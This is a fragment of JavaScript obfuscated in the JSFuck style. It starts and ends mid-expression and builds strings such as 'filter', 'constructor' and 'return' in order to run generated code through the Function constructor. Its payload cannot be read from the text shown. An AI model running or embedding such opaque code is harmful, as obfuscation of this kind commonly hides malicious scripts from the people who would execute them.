[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]])+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[!+[]+!+[]]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+![]+[][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+[][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+[][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+[][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+[][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+